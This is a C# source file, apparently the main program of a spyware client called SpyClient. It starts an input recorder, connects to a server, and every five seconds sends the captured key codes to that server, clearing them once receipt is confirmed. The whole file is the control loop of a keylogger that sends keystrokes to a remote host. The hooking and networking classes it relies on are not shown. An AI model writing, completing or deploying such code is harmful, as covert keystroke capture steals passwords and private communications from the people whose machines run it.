

using SpyCommunicationLib;

namespace SpyClient
{
    internal class Program
    {
        InputRecord _inputRecord;
        SpyClient _spyClient;

        public Program()
        {
            _inputRecord = new InputRecord();
            _spyClient = new SpyClient();
        }

        public async Task Work() {
            
            _inputRecord.Run();
            _spyClient.ConnectAsync().Wait();

            if (!_spyClient.IsConnected)
            {
                Console.WriteLine("[SpyClient] server not found");
                return;
            }

            while (true)
            {
                List<int> inputs = _inputRecord.GetInputs().ToList();
                
                if (inputs.Count != 0)
                {
                    await _spyClient.SendKeysAsync(inputs);
                    SpyResponse<object>? responseData = await _spyClient.GetResponseAsync();
                    if (responseData?.Code == ResponseCode.Success)
                    {
                        _inputRecord.ClearInputs();
                    }
                }

                Thread.Sleep(5000);
            }
        }

        static async Task Main(string[] args)
        {
            Program program = new Program();
            await program.Work();
        }
    }
}
